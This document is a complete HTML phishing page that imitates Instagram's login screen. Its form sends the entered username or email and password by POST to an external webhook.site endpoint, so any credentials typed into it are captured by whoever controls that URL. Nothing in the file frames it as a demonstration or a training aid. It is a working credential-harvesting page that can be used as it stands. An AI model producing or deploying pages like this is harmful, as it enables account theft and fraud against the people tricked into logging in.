<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #fafafa; }
        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; box-sizing: border-box; text-align: center; }
        .logo { font-size: 40px; font-weight: bold; margin-bottom: 25px; font-family: 'Times New Roman', Times, serif; font-style: italic; }
        input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; font-size: 12px; box-sizing: border-box; }
        button { width: 100%; background-color: #0095f6; color: white; border: none; padding: 7px; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 10px; font-size: 14px; }
        button:hover { background-color: #1877f2; }
        .footer { margin-top: 20px; font-size: 12px; color: #8e8e8e; }
    </style>
</head>
<body>

    <div class="login-box">
        <div class="logo">Instagram</div>
        
        <form action="https://webhook.site/01f47bf5-df32-47d3-a46e-7d34c85d3729" method="POST">
            <input type="text" name="user_id" placeholder="Phone number, username, or email" required>
            <input type="password" name="user_pass" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>

        <div class="footer">
            Forgot password?
        </div>
    </div>

</body>
</html>
